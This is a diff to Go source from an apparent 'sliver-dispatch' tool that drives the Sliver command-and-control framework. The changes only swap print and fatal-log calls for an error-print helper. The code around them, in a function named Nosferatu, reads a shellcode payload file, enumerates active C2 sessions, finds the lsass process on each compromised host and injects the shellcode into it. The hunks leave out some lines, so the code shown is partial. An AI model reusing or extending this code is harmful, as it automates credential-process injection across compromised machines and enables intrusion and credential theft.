@@ -3,7 +3,6 @@ package dispatch
 import (
 	"context"
 	"fmt"
-	"log"
 	"os"
 	"sliver-dispatch/utils"
 	"sort"
@@ -18,20 +17,20 @@ import (
 func Nosferatu(rpc rpcpb.SliverRPCClient, args ...string) {
 
 	if len(args) < 1 {
-		fmt.Println("Need the full path to nosferatu.bin")
+		utils.Eprint("Need the full path to nosferatu.bin")
 		return
 	}
 
 	b_nosferatu, err := os.ReadFile(args[0])
 	if err != nil {
-		fmt.Println("Error reading file:", err)
+		utils.Eprint("Error reading file:", err)
 		return
 	}
 	var sessions *clientpb.Sessions
 
 	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
 	if err != nil {
-		log.Fatal(err)
+		utils.Eprint(err.Error())
 	}
 
 	var session *clientpb.Session
@@ -61,7 +60,7 @@ func Nosferatu(rpc rpcpb.SliverRPCClient, args ...string) {
 			})
 
 			if pid == -1 {
-				fmt.Println("Could not find lsass pid!")
+				utils.Eprint("Could not find lsass pid!")
 				continue
 			}
 
@@ -79,7 +78,7 @@ func Nosferatu(rpc rpcpb.SliverRPCClient, args ...string) {
 					},
 				})
 			if shellcode_task.Response != nil {
-				fmt.Println("Error: " + shellcode_task.Response.Err)
+				utils.Eprint("Error: " + shellcode_task.Response.Err)
 			}
 		}
 	}
